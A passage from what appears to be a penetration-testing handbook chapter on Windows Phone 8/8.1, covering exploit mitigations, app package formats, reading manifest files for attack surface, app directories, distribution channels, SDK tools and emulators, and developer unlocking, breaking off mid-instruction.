/SAFESEH to pass the Store certification requirements,\nsee http://msdn.microsoft.com/en-us/library/windowsphone/develop/dn629257.aspx.\nUserland Heap Safe Unlinking\nPrior to Windows XP SP2 (2004) and Windows 2003, heap overflow vulnerabilities were most often exploited\nby taking advantage of the unsafe unlinking by tactically overwriting doubly linked list back and forward\npointers in an adjacent chunk’s metadata. This general method offered a powerful “write-what-where”\nexploitation primitive.\nSince then, the various versions of Windows have seen progressive improvements to their heap manager\nimplementations to the point where the comparatively simple heap overflow exploitation techniques from\nseveral years ago are no longer applicable in the more recent versions of Windows, except perhaps in custom\nheap manager implementations.\nThere are known exploitation techniques against the Windows 8 (and by extension, Windows Phone 8) heap\nmanager, as discovered and presented by Chris Valasek and Tarjei Mandt (paper available at\nhttp://illmatics.com/Windows%208%20Heap%20Internals.pdf), though these are understood to be non-trivial\nand the protection offered by Windows 8’s heap manager is far and away superior to those of yesteryear.\nThe heap manager in Windows 8.1 (and Windows Phone 8.1) addresses at least one of Valasek’s and Mandt’s\ntechniques (according to http://blogs .technet.com/b/srd/archive/2013/10/29/software-defense-\nmitigation-heap-corruption-vulnerabilities.aspx), and further hardens the userland heap against successful\nattacks.\nMitigations in Kernel Space\nAlthough an in-depth discussion on kernel exploit mitigations in Windows Phone 8 and 8.1 is beyond the scope\nof this book, it’s worth mentioning briefly that the 8 and 8.1 operating systems actually implement equivalent\nexploitation mitigation technologies that we’ve already discussed for protection against kernel space\nexploitation as well. There are also some protection features that are unique to the kernel, and in fact, the\nWindows 8 kernel.\nSeveral of the anti-exploit features present in the WP8 and WP8.1 kernels are:\nNX (for non-paged pools)\nASLR\nStack cookies\nKernel heap (pool) integrity checks\nNULL pointer dereference protection\nUnderstanding Windows Phone 8.x Applications\nWe’ve discussed the security model and features of the WP8 and 8.1 platform; now let’s look at some of the\ndetails of how applications are developed, the language options available to developers, how apps are distributed\nand installed, and how you as the reader can take advantage of these aspects in helping with analysis and\nsecurity testing of WP8 and 8.1 third-party software.\nApplication Packages\nOn Windows 7 and Windows 8, XAP packages are the standard means of distributing the installing applications.\nAn XAP file generally contains all the files required by the application for installation and operation, including\nits code in binary or .NET assembly form (DLLs), its resources (images, sound files, etc.), and the manifest file\n(WMAppManifest.xml and/or Package.appxmanifest), among other possible files. Although Windows Phone 7 and\nWindows Phone 8.x both use XAP files, they are not completely compatible across the two OS versions; a\nWindows Phone 7 XAP can be installed on Windows Phone 8.x, but a Windows Phone 8.x XAP cannot be\ninstalled on Windows Phone 7. XAP files are backward compatible.\nSimilarly to the distribution packages of other mobile platforms such as iOS (IPA) and Android (APK), XAP files\nare fundamentally zip files.\nWith the initial releases of Windows Phone 8.1, Microsoft has introduced the APPX package format, exclusively,\nhowever, for Windows Phone 8.1 and not Windows Phone 8. Although APPX is WP8.1’s preferred package\nformat, WP8.1 is backward compatible and can install XAP packages intended for WP8.\nUnzipping XAP and APPX files that have been downloaded from the Store is no trivial task, however, because\nthey are DRM protected, and therefore encrypted. XAP and APPX files that are not Microsoft signed and DRMed\ncan be unzipped and their contents inspected, including the application’s binaries themselves. (See Figure 10.4.)\nFigure 10.4 Unzipped non-Store XAP package\nThe introduction of a package format just for WP8.1 and later, APPX, is due to the addition of new features in\nWP8.1 that are simply not available in WP8 (such as new APIs) but also to standardize package distribution\nbetween Windows Phone and standard Windows.\nProgramming Languages and Types of Applications\nThe Windows Phone 8 and 8.1 platforms support multiple programming languages as standard—and more. In\nfact, than all the other mainstream mobile OSes. Developers have the choice between using native code and\nwriting their applications in managed languages.\nThe majority of applications can be placed in at least one of the following general categories:\nStandard applications\nGames\nHTML5/JavaScript/CSS applications\nHybrid/shell apps\nMost applications available in the Store fit into a standard category and are most often developed in C# with\nXAML files comprising the interface. XAML, which stands for eXtensible Application Markup Language, is used\nby .NET apps to simplify the creation and representation of user interface components. Though most apps in\nthis general category are developed in C#, some are written in C++ and Visual Basic.\nAlthough developing games in C# is possible, the majority of games available for Windows Phone 8.x are\ndeveloped in C++, and this is Microsoft’s recommended language for game apps. Many games call into Direct3d\nfor their graphics generation and manipulation abilities.\nDevelopers also have the ability to develop functional applications using HTML5 and JavaScript, often also\nutilizing some XAML for their interface components. Applications developed using JavaScript and HTML5 are\nnot merely client-side web apps. The Windows Runtime (WinRT) exposes an entire API so that apps written in\nJavaScript can access much of the same functionality that a normal app can.\nIt’s not uncommon for apps to use a language such as C# yet also use JavaScript and HTML5 for various things,\nincluding (but not limited to) its interface components. These could be loosely termed hybrid apps. The term\nhybrid app could also be used to describe an app that is little more than a C# app (for example) which utilizes\nweb-view type objects to render a web app and doesn’t call into much OS functionality at all.\nThe choice of language is up to the developer, but Microsoft offers some general guidelines on which languages\nare suitable for certain tasks (see http://msdn .microsoft.com/en-\nus/library/windowsphone/develop/jj714071(v=vs.105) .aspx#BKMK_Decidingonanapproach, for example). Most\nproficient developers should be in a position to analyze the situation and determine a language’s suitability for\nthemselves, however.\nIn general, using native code if an application needs to be highly optimized makes sense. Examples of such\napplications include games, which are generally written in C++, using Direct3d.\nAnother reason for writing applications solely in native code would be language familiarity; experienced C++\ndevelopers may find implementing functionality in C++ to be easier than learning a related but different\nlanguage like C#. Equally, many developers may opt for the comfort of C# and then call into existing native\nlibraries that are performance critical using the P/Invoke interface.\nIt is generally known on an empirical basis that C# is the most commonly used language for Windows Phone\napplication development. For this reason, we place the majority of our focus on reviewing C# apps, though most\nof the discussion can be applied to Windows Phone apps written in other languages.\nApplication Manifests\nAs briefly mentioned earlier in this chapter, every Windows Phone app has a manifest file that contains details\nabout the application. The information in an app manifest can be considered metadata, and among other things\nsome of the more basic aspects of information found inside an app’s manifest are its App ID, publisher/author,\nthe app’s name/title, a description of the app, and the relative path to the app’s logo.\nWindows Phone 8.1 can install both XAP files and APPX files. Manifest files for apps that are deployed\nspecifically from APPX packages are named Package .appxmanifest, although APPX packages also contain a\nWMAppManifest.xml file like XAP files as well. Windows Phone 8 devices can only install XAP packages, whose\nmanifest file is WMAppManifest.xml.\nIn addition to the basic app information already mentioned, application manifests also contain information that\nis somewhat more interesting from a security and exploration standpoint and as such manifests can serve as\nuseful starting points for penetration testing and reverse engineering an app. As mentioned earlier (see\nChambers and Capabilities) an app’s manifest also defines which permissions the application needs to be able to\nprovide its functionality.\nAlthough an application’s manifest holds much metadata that is needed to deploy the app correctly and in the\nway that the developer intended, we’ll focus mainly here on the aspects of the manifest that are useful from\nyour perspective, as a penetration tester and/or a reverse engineer.\nBoth types of manifest, WMAppManifest.xml and Package.appxmanifest, are just standard XML files. The two\ntypes do differ in structure and in the tags that they use to present their app metadata. We’ll go through each\none separately and explain how to glean information that is useful from a security and analysis point of view.\nAttack Surface Enumeration\nManifest files support a number of parent and child XML elements, but rather than listing them all, we’ll\nconsider several that are interesting for an initial attack surface and entry point analysis. A few of these are\n<Capabilities>—Defines the capabilities required by the application\n<FileTypeAssociation>—Defines the file extensions that are associated with the app\n<Protocol>—Defines URL schemes that the app wishes to register for\n<ActivatableClass>—Defines classes that are used by the app that are external to it\n<Interface>—Specifies interfaces that the app implements that are external to it\nWe’ll consider and analyze the following manifest file snippets as examples of how each of these elements are\nused, what they tell us about the application at a glance. The following capability tags were borrowed from the\nWMAppManifest .xml file from a typical app (distributed in XAP format):\n<Capabilities>\n<Capability Name=\"ID_CAP_NETWORKING\" />\n<Capability Name=\"ID_CAP_LOCATION\" />\n<Capability Name=\"ID_CAP_SENSORS\" />\n<Capability Name=\"ID_CAP_MICROPHONE\" />\n<Capability Name=\"ID_CAP_PHONEDIALER\" />\n<Capability Name=\"ID_CAP_PUSH_NOTIFICATION\" />\n<Capability Name=\"ID_CAP_WEBBROWSERCOMPONENT\" />\n<Capability Name=\"ID_CAP_IDENTITY_DEVICE\" />\n<Capability Name=\"ID_CAP_IDENTITY_USER\" />\n<Capability Name=\"ID_CAP_CONTACTS\" />\n<Capability Name=\"ID_CAP_MEDIALIB_AUDIO\" />\n<Capability Name=\"ID_CAP_MEDIALIB_PHOTO\" />\n<Capability Name=\"ID_CAP_MEDIALIB_PLAYBACK\" />\n<Capability Name=\"ID_CAP_PROXIMITY\" />\n<Capability Name=\"ID_CAP_MAP\" />\n<Capability Name=\"ID_CAP_VOIP\" />\n<Capability Name=\"ID_CAP_PEOPLE_EXTENSION_IM\" />\n</Capabilities>\nThe child elements within the <Capabilities> element clearly show which capabilities the application requests\nupon installation. This is useful for a number of reasons. First, if you see ID_CAP_NETWORKING, for example, you\nknow that the application contains functionality that talks to other systems over the network, most likely the\nInternet. Second, if the application you are installing is supposedly a calculator, yet you see that the application\n“requires” ID_CAP_CONTACTS, you may become suspicious about the innocence of the app, and reverse engineer it\nas a potential malware suspect.\nMoving on, a typical <FileTypeAssociation> element in a manifest may look something like the following:\n<Extensions>\n<FileTypeAssociation Name=\"Windows Phone SDK test file type\"\nTaskID=\"_default\" NavUriFragment=\"fileToken=%s\">\n<Logos>\n<Logo Size=\"small\" IsRelative=\"true\">Assets/sdk-small-\n33x33.png</Logo>\n<Logo Size=\"medium\" IsRelative=\"true\">Assets/sdk-medium-\n69x69.png</Logo>\n<Logo Size=\"large\" IsRelative=\"true\">Assets/sdk-large-\n176x176.png</Logo>\n</Logos>\n<SupportedFileTypes>\n<FileType ContentType=\"application/sdk\">.myExt1</FileType>\n<FileType ContentType=\"application/sdk\">.myExt2</FileType>\n</SupportedFileTypes>\n</FileTypeAssociation>\n</Extensions>\nIf you were analyzing an application whose manifest contained the preceding snippet, you would know that the\napp has registered handlers for the .myExt1 and .myExt2 file extensions. File extension handlers are data entry\npoints to the application, and are therefore good places to start looking for vulnerabilities. At this point,\npenetration testers would be on the lookout for file type handling code when they later begin their reverse\nengineering or code review activities.\nNow consider the following WMAppManifest.xml snippet, which shows a real-world example of the <Protocol>\nelement from the Windows Phone 8 Facebook application.\n<Protocol Name=\"fb\" NavUriFragment=\"encodedLaunchUri=%s\"\nTaskID=\"_default\" />\n<Protocol Name=\"fbconnect\" NavUriFragment=\"encodedLaunchUri=%s\"\nTaskID=\"_default\" />\nIt’s evident from the preceding snippet that the Facebook application registers two protocol handlers: fb:// and\nfbconnect://. Knowing this, a penetration tester or reverse engineer would then know to search for and analyze\nprotocol handlers during their review, because these handlers represent a potentially interesting entry point to\nthe app.\nFollowing is an example of <ActivatableClass>, taken from the WMAppManifest .xml of a VoIP app.\n<ActivatableClasses>\n<InProcessServer>\n<Path>PhoneVoIPApp.BackEnd.DLL</Path>\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.MessageReceivedEventHandler\"\nThreadingModel=\"MTA\" />\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.BackEndTransport\"\nThreadingModel=\"MTA\" />\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.BackEndAudio\"\nThreadingModel=\"MTA\" />\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.CameraLocationChangedEventHandle\nr\" ThreadingModel=\"MTA\" />\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.BackEndCapture\"\nThreadingModel=\"MTA\" />\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.IncomingCallDialogDismissedCallb\nack\" ThreadingModel=\"MTA\" />\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.CallController\"\nThreadingModel=\"MTA\" />\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.Globals\" ThreadingModel=\"MTA\" />\n</InProcessServer>\n<OutOfProcessServer ServerName=\"PhoneVoIPApp.BackEnd\">\n<Path>PhoneVoIPApp.BackEnd.DLL</Path>\n<Instancing>multipleInstances</Instancing>\n<ActivatableClass\nActivatableClassId=\"PhoneVoIPApp.BackEnd.OutOfProcess.Server\" />\n</OutOfProcessServer>\nFrom the preceding code, you can tell that the application is registered to make use of external VoIP classes,\nPhoneVoIPApp.BackEnd.CallController, for example. Knowing this, you may also consider these classes as\ncandidates for reverse engineering and/or security review as well, because the app does use them for some of its\nfunctionality.\nFinally, consider the following <Interface> tags from the manifest of the same VoIP application:\n<ProxyStub ClassId=\"{F5A3C2AE-EF7B-3DE2-8B0E-8E8B3CD20D9D}\">\n<Path>PhoneVoIPApp.BackEndProxyStub.DLL</Path>\n<Interface\nName=\"PhoneVoIPApp.BackEnd.__IBackEndTransportPublicNonVirtuals\"\nInterfaceId=\"{F5A3C2AE-EF7B-3DE2-8B0E-8E8B3CD20D9D}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.__IBackEndTransportProtectedNonVirtuals\"\nInterfaceId=\"{044DEA28-0E8D-3A16-A2C1-BE95C0BED5E5}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.__IBackEndAudioPublicNonVirtuals\"\nInterfaceId=\"{DE465431-ED24-3298-A187-8F1AFBBBE135}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.ICallControllerStatusListener\"\nInterfaceId=\"{39126060-0292-36D6-B3F8-9AC4156C651D}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.__IBackEndCapturePublicNonVirtuals\"\nInterfaceId=\"{8313DBEA-FD3B-3071-8035-7B611658DAD8}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.__IBackEndCaptureProtectedNonVirtuals\"\nInterfaceId=\"{64B31D5B-1A27-37A8-BCBC-C0BBD5314C79}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.__ICallControllerPublicNonVirtuals\"\nInterfaceId=\"{06B50718-3528-3B66-BE76-E183AA80D4A5}\" />\n<Interface Name=\"PhoneVoIPApp.BackEnd.IVideoRenderer\"\nInterfaceId=\"{6928CA7B-166D-3B37-9010-FBAB2C7E92B0}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.__IGlobalsPublicNonVirtuals\"\nInterfaceId=\"{C8AFE1A8-92FC-3783-9520-D6BBC507B24A}\" />\n<Interface Name=\"PhoneVoIPApp.BackEnd.__IGlobalsStatics\"\nInterfaceId=\"{2C1E9C37-6827-38F7-857C-021642CA428B}\" />\n<Interface\nName=\"PhoneVoIPApp.BackEnd.OutOfProcess.__IServerPublicNonVirtuals\" InterfaceId=\"{7BF79491-56BE-\n375A-BC22-0058B158F01F}\" />\n</ProxyStub>\nThe <Interface> tags in the previous manifest fragments tell you that the app implements the preceding\nexternally defined interfaces. This just tells you a little more about how the app works.\nThe preceding examples make it quite evident that a reasonable amount of information can be gleaned about an\napp through just a very cursory analysis of its manifest file, including its capabilities, some entry points, and\nexternal components that it calls into.\nSeveral other tags and patterns are interesting from an attack surface assessment point of view. We recommend\nyou refer to MSDN’s manifest file documentation for reference when analyzing manifest files to determine the\nnature of unfamiliar and possibly interesting tags you come across. See http://msdn .microsoft.com/en-\nus/library/windowsphone/develop/ff769509.aspx.\nPackage.appxmanifest files (from APPX packages) take on a similar format to WMAppManifest.xml files.\nMicrosoft encourages the use of the Package .appxmanifest file in favor of WMAppManifest.xml for some aspects\nsuch as capability definitions in the context of WP8.1 apps, but APPX packages also have a WMAppManifest.xml\nfile as well, so remember to review this file also.\nTIP\nWhen the application being reviewed is a Store app, getting direct access to manifest files won’t be\npossible; the XAP or APPX file will be DRM protected and won’t be extractable from the actual file that\nwas downloaded. You can instead retrieve the manifest file(s) from the device after installing the app. (See\n“Building a Test Environment” later in this chapter.)\nApplication Directories\nInstalled applications have two main directories that are used exclusively by them: the app’s install directory;\nwhere its binaries, .NET assemblies, and other assets are stored; and the app’s local storage directory, where the\napp can store data, and where web cache, cookies and other information is stored.\nAll installed apps have their own install directory, located at C:\\Data\\Programs\\{GUID}\\Install, where {GUID} is\nthe app’s ID. You’ll make extensive use of applications’ install directory later for extracting apps from the device\nwhen you hack your device and gain full filesystem access to it. The install directories for all apps installed on\nthe device can be explored by browsing at C:\\Data\\Programs.\nEach app also has its own local storage directory; this can be thought of as the app’s filesystem sandbox. The\nlocal storage directory tree for an app whose ID is GUID may be found at C:\\Data\\Users\\DefApps\\APPDATA\\\n{GUID}.\nThe local storage area for each app has the following directories in its tree:\nLocal\nLocalLow\nPlatformData\nRoaming\nFrameworkTemp\nTemp\nINetCache\nINetCookies\nINetHistory\nOf these directories, Local is generally the most used one. Local is the directory most often used for data storage\nby apps.\nINetCache, INetCookies, and INetHistory are also interesting from a security perspective, since all of the above\ndirectories have the potential to hold data that constitute sensitive data leaks.\nIn the remainder of the Windows Phone sections in this book you’ll frequently browse applications’ install\ndirectories and local storage directories, for extraction of app binaries and assets, and for exploration of\napplications’ filesystem sandbox.\nDistribution of Windows Phone Applications\nThere are a few ways in which applications are distributed and installed. Of course, the most commonly used\nmethod is simply the Windows Phone Store, but there are other distribution mediums and installation methods\nthat are interesting to developers and security reviewers. We’ll discuss these methods in the following five\nsections and their relevance to carrying out security assessments.\nWindows Phone Store\nSo far we’ve mentioned the Store for downloading Windows Phone applications several times. The Store\napplication on the device itself is the standard means of downloading and installing applications.\nThe Store allows users to search for applications by keyword, and also by category; for example, education,\nbusiness, entertainment, news, weather, and so on. The app also has tiles that allow users to view apps that are\nbest-rated, top free, and top paid.\nAlthough the vast majority of applications in the Store were developed and published by third-party vendors,\nMicrosoft actually sells some of its own products in the Store as well. Examples include OneDrive, Lync, and\nSkype.\nIn addition to the apps section of the Store app, there are also sections for games and music. The Store app on\nsome devices has a section specific for applications intended for devices made by that OEM only; for example,\nStore on Samsung devices has a “Samsung Zone” section to the app. Similarly, Store on Nokia devices has a\n“Nokia Collection” area, and HTC devices have an “HTC Apps” area. Some mobile network carriers may also\nhave their own area that appears when the device is connected to their network. Figure 10.5 shows the splash\nscreen for the Store app on a typical Samsung device running Windows Phone 8.\nFigure 10.5 Splash screen for a Samsung Windows Phone 8 device\nSimilarly to the app stores for the other mainstream mobile operating systems (iOS, Android, BlackBerry), some\napps are free of charge.\nThe Windows Phone Store has been so named since Windows Phone 7, before which it was known as the\nWindows Phone Marketplace, when Microsoft’s current mobile operating system was Windows Mobile, now\ndeprecated.\nStore Sideloading\nAlthough the standard means of installing WP8 and WP8.1 applications is from the on-device Store app,\napplications can also be downloaded from a desktop system and then installed using an SD card. This method of\ninstallation is known as sideloading and presumably exists in case a user doesn’t have Internet access from a\ndevice but does have network access on a desktop or laptop system. Instructions for installing Store apps via\nsideloading are available at the Windows Phone site (http://www.windowsphone.com/en-gb/how-\nto/wp8/apps/how-do-i-install-apps-from-an-sd-card).\nIn Windows Phone 8.1, you also have the option of installing an app directly to an SD card, as opposed to simply\ninstalling it onto the device from the SD card.\nCompany App Sideloading/Distribution\nFor applications developed for internal use at organizations, a distribution method known as “Company app\ndistribution” allows the Store and Microsoft certification to be bypassed and apps to be published directly to the\ncompany’s employees. This method is available on Windows Phone 8 and 8.1.\nThis distribution and installation scheme requires companies to register a company account on the Windows\nPhone Dev Center and acquire an enterprise certificate for signing their apps. The company then develops its\napplications and signs them using the enterprise certificate it obtained. Many companies also develop a\n“Company Hub” application to act as a portal from which to download their internal apps.\nEmployees then enroll their phone for app distribution from their company, and at that point they’ll be able to\ninstall the internal apps signed with their company’s enterprise certificate. The full process has been\ndocumented in detail by Microsoft (see http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/jj206943(v=vs.105).aspx for more information).\nTargeted Application Distribution\nTargeted app distribution is a means for publishing your application via the Dev Center while hiding your app\nfrom view in the Windows Phone Store.\nAll apps published via targeted app distribution are subject to the same vetting and certification process as\nregular Store apps. When Microsoft approves and certifies your app, you are then able to give users you select a\nlink to the app so they can install it. Because the app will not be visible in the Store, yet is downloadable by users\nwith a particular link, it is possible to allow downloads from only the users you choose, such as members of a\ncommon organization, club, or user group. The apps publisher can unhide an app published in this way so that\nany Store user can find and download it.\nAs with other distribution methods, Microsoft has official documentation on target app distribution on MSDN.\nNote that applications containing company-sensitive information would probably be more securely distributed\nvia Company Application Distribution than by this method, because even when an app is targeted and therefore\nhidden in the Store, if users somehow find the app’s link, they will be able to download it as any normal app.\nDeveloper Sideloading\nSideloading applications using developer functionality is the most general and easily available way of installing\napps without code signing. Having this ability is practically a necessity as well from the standpoint of a\ndeveloper, because truly knowing whether apps work on real phones without actually testing them is very\ndifficult.\nInstalling applications as a developer requires the user to register for a developer account, and then register her\ndevice, thereby attaining “developer unlock.” The process is quick and easy and is carried out using the Windows\nPhone Developer Registration application (explained at http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/ff769508(v=vs.105).aspx), which comes as part of the WP8 and WP8.1\nSDKs. Each developer account is capable of unlocking three devices. One device can be developer unlocked\nwithout having a developer account—all that is needed is a Live ID.\nAfter the user has unlocked her device for development she can deploy application packages to it using the\nApplication Deployment tool, which also comes bundled with Windows Phone SDKs. Applications being\ndeployed do not need to be signed in any way; users are free to create app packages and distribute them to other\nusers with developer-unlocked devices, and likewise install unsigned apps created by other developers,\nbypassing the Store and enterprise distribution. From a hacker’s point of view this is extremely useful for\nresearching and developing capability unlock methods and subsequently developing home-brew applications for\npersonal use and the rest of the Windows Phone hacking community.\nDeveloper unlocking and sideloading (via the Application Deployment tool), and how it is carried out is\ndiscussed in more detail later in the “Developer Unlocking Your Device” section, where we discuss how to build\nan environment suitable for penetration testing, exploring, and reverse engineering Windows Phone\napplications.\nBuilding a Test Environment\nAs with all penetration testing and exploratory activities having a setup that facilitates a certain degree of\nprobing into an application’s internals is necessary. Likewise, being well equipped with essential tools and\nfamiliar with how to use them and how they can be of use in your assessments is important.\nHaving the tools and knowledge is even more essential when assessing applications that are running on mobile\nplatforms. Whereas standard desktop applications can usually be disassembled (that is, using IDA Pro) and their\nbehavior observed using debugging, instrumentation utilities, most modern mobile operating systems are far\nless open.\nTo serve as an example, consider an application installed on a desktop Windows system, such as Windows 8. A\npenetration tester can trivially attach a debugger of his choice (Windbg, OllyDbg) and analyze the app’s behavior\nusing tools like ProcMon.\nSimilarly, a user on Linux can attach and debug using GDB or Valgrind and can use strace, ltrace, and lsof to\nobserve various behaviors.\nTesters in more open computing environments have far greater insight into how applications are behaving on\nthe dynamic level and getting at binaries for static analysis is somewhat easier for them.\nMost recent mobile operating systems are much more closed, and even though you may consider yourself the\ndevice’s owner and administrator you are still dealing with a closed-computing platform—at least in comparison\nto most desktop environments.\nTo assess the security aspects, having more involved access to a device than users were supposed to be able to\nhave—for example, when we do not have source code available for the app being tested—is therefore beneficial\nand oftentimes necessary. This generally involves bypassing the blackbox nature that Windows Phone devices\nare intended to be by overcoming some of the security controls put in place by the vendor. In many cases the\ntester is more fortunate and will have access to source code of the application. Whichever is the case, the tester\nwill be in much better stead to carry out assessment from a solid test environment with the right tools, and with\nfavorable privileges and conditions.\nThis section guides you through the process of building such an environment, from obtaining SDK tools such as\nVisual Studio and the emulators, to unlocking application capabilities and getting access to the filesystem of a\ndevice.\nSDK Tools\nSDK tools are core to development and security review activities on Windows Phone 8.x. Two of the most\nimportant tools included in the Windows Phone SDKs are Visual Studio and the emulator. You’re likely to find\nuse of these tools in reviewing code (either original or reversed code) and running apps from source,\nrespectively. In the next few sections we’ll discuss how to obtain these tools and give a general introduction to\nthem.\nObtaining the Development Tools\nSDKs are made available for Windows Phone 8 and Windows Phone 8.1 development by Microsoft for free of\ncharge.\nChoosing a suitable SDK package equipped for use in Windows Phone work depends on the version of Windows\nPhone that you are interested in; for Windows Phone 8.1, Microsoft provides a free Visual Studio Express 2013\npackage that includes the Phone 8.1 SDK, emulators, and other WP8.1 development tools, in addition to\ndevelopment environments for other types of apps.\nFor exclusively Windows Phone 8 activities that don’t include Windows Phone 8.1, Microsoft provides a free\nSDK 8.0 bundle that includes Visual Studio Express 2012 for Windows Phone, the complete SDK, emulators,\nand additional WP8 developer tools.\nThese two SDK options are available from http://dev.windowsphone.com/en-us/downloadsdk, but we’ll just\nbriefly summarize the differences between these two SDKs in the next three passages.\nYou should install the Windows Phone 8.1 SDK, because Windows Phone 8.1 SDK is equipped for both\nWindows Phone 8 and 8.1 development, and it’s likely that you will want to deal with both WP8 and WP8.1\napplications. The Windows Phone 8.1 SDK is equipped for development of both WP8 and WP8.1 apps, but the\nconverse is not true. It should be noted that the Windows Phone 8.1 SDK requires Windows 8.1 or later to be\ninstalled. Windows 8 is not supported.\nThe complete Windows Phone 8.1 SDK can be obtained by visiting the following link:\nhttp://www.visualstudio.com/downloads/download-visual-studio-vs#d-express-windows-8. Alternatively, if\nyou already have Visual Studio 2013 installed, you can simply install Update 3, which contains material needed\nfor Windows Phone development, via this link: http://www.visualstudio.com/en-us/downloads#d-visual-\nstudio-2013-update. Both of these packages require at least Windows 8.1 x86 to be installed for Windows\nPhone 8.1 development; however, the emulators require at least Windows 8.1 Professional (x64) and a processor\nthat supports Client Hyper-V and Second Level Address Translation.\nIf you aim to review only Windows Phone 8 applications, you can just download the Windows Phone SDK 8.0\ndirectly from this URL: http://go.microsoft.com/fwlink/p/?LinkId=265772, and you can also download and\ninstall any updates that are also available under the Windows Phone 8 heading on\nhttp://dev.windowsphone.com/en-us/downloadsdk. Installation of the Windows Phone 8 SDK requires at least\nWindows 8 or later, and the emulators require a processor that supports Client Hyper-V and Second Level\nAddress Translation.\nWhichever package you choose, it will be downloaded as an MSI installer. Installation should be simple,\nassuming you have the necessary system specifications. Installation of any of the packages with the standard\noptions is quite sufficient.\nVisual Studio\nVisual Studio is Microsoft’s official integrated development environment, and it’s used for development of\nvirtually all applications that use Microsoft technologies or run on Windows platforms. Windows Phone is no\nexception.\nIn addition to being ready for the development of the several kinds of standard Windows projects, the Visual\nStudio packages mentioned previously also integrate several features that are useful specifically for Windows\nPhone development. For example, various project templates are available when creating a new project via File\nNew Project, as shown in Figure 10.6.\nFigure 10.6 Creating a new WP8 project\nExisting solutions and projects are easy to open in the same way as other Visual Studio projects; either by\ndouble-clicking the solution or project file (for example, .sln) in Explorer or by locating the solution using File\nOpen Project.\nYou are likely to make extensive use of Visual Studio in your security assessments, particularly in the following\nareas:\nManually reviewing source code\nRunning projects from source on an emulator and devices\nUsing Visual Studio’s debugging tools on source codebases\nCreating test cases and test harnesses for suspect code fragments\nDeveloping security-related testing tools for developer sideloading\nFor example, after a codebase has been developed or otherwise loaded into Visual Studio, running the\napplication in the emulator with debugging (F5) or without debugging (Ctrl+F5) is a trivial task.\nIf the app is launched with debugging, any breakpoints set will be active, and the offending line of code will be\nshown with the runtime and/or register state if an unhandled exception occurs.\nHaving a working development and build environment at hand is useful for prototyping and testing code\nfragments. When testing and code reviewing applications from a security standpoint being able to observe\nexactly what happens when a certain piece of code executes is often handy, because API behavior can often be\nunclear from documentation and having proof of behavior generally serves to eliminate any doubt about\nwhether suspect code is actually buggy.\nA thorough introduction to Visual Studio’s many features is beyond the scope of this book, but Microsoft has\nmany online resources discussing the software, its usage, and use of its features. See\nhttp://msdn.microsoft.com/en-gb/vstudio/aa718325(v=vs.110).aspx and http://www.visualstudio .com/ for\nfurther references.\nEmulator\nThe Windows Phone emulators are invaluable tools that come bundled as standard with the WP8 and 8.1 SDKs.\nIf you installed either or both of the SDK packages described in the previous section, you will now have the\nemulator for WP8, WP8.1, or both. In both cases the emulators are applications that provide Windows Phone\nenvironments using Microsoft’s native hypervisor, Hyper-V.\nThe execution environment provided by the emulators closely matches the environment you would typically\nfind when executing applications on real Windows Phone devices. The emulator is not an emulator or simulator,\nlike the iPhone simulator is, for example, but is in fact a genuine Windows Phone instance, albeit one running\nin a virtual machine instead of on a mobile device. So, for example, all the same sandbox and capabilities\nrestrictions apply in the emulator just as they do when an app is deployed to a device.\nThere are two primary ways of running applications in the emulator:\nAs mentioned in the earlier section, “Visual Studio,” you can build applications from source in Visual Studio\nand launch them in the emulator. To build and launch with debugging, you can use the F5 shortcut, and to\nrun without, use Ctrl+F5. These two actions can also be carried out using the Debug menu, and using the\ngreen Play button on the toolbar.\nYou can also deploy prebuilt application packages (non-Store), XAP and APPX files, to the emulator using\nthe SDK’s Application Deployment tool, shown in Figure 10.7. The Application Deployment tool bundled\nwith the 8.1 developer tools/SDK is capable of deploying both XAP and APPX files, whereas the tool found in\nthe 8.0 SDK deals only with XAP packages.\nFigure 10.7 Application Deployment tool\nAfter the Application Deployment application has been launched, the tool allows you to choose a target device,\nwhich includes several different emulator options. The user can then browse the filesystem and select which\napplication package to deploy, and then click Deploy to install the app and launch the emulator.\nNote that applications that have been downloaded from the Store cannot be run on the emulators, because they\nare DRM protected; these files can only be deployed to real devices. The emulator is useful in scenarios where\nyou have access to a project’s source code, or you have been given an application package for testing that has\nbeen built and given to you without being put through Store certification first.\nDeveloper Unlocking Your Device\nWhen carrying out experiments and security assessments, having the ability to run code on your device without\nhaving to get it signed first is important. This is where developer unlock is useful, as mentioned earlier in the\n“Developer Sideloading” section. Developer unlocking your device enables you to sideload unsigned apps onto\nyour device.\nHowever, reasons exist for why developer unlocking a device is useful from a security testing perspective. We\nmentioned earlier that having abilities that are not normally offered by the OS, such as being able to view the\nfilesystem, is often necessary in mobile application assessments. Because things like “full” access to the\nfilesystem are not normally offered by Windows Phone, hacker-types must exploit weaknesses in the OS and\nOEM software to obtain these kinds of abilities. However, to exploit such bugs, you need to be able to run code\non the device that would certainly not be approved by the Store vetting process.\nFigure 10.8 Developer Registration tool\nThe next section (“Capability Unlocking and Beyond”) covers how exactly to gain these advanced abilities, but\nfirst we explain how to achieve developer unlock on your device, because it is a necessary precursor as we\nimplied earlier. Follow these steps to developer unlock your WP8 or WP8.1 device:\n1. Launch the Windows Phone Developer Registration or Windows Phone Developer Registration 8.1\napplication, depending on the version of Windows Phone running on your device.\n2. Make sure your device’s screen is unlocked and the device is plugged into your computer via the microUSB\ncable. The time and date on the device must also be correct, and the device must be connected to the\nInternet. When the device is detected the Register button becomes clickable.\n3. Click Register (see Figure 10.8). A login dialog box appears.\n4. Log in with the credentials for your Windows Live or 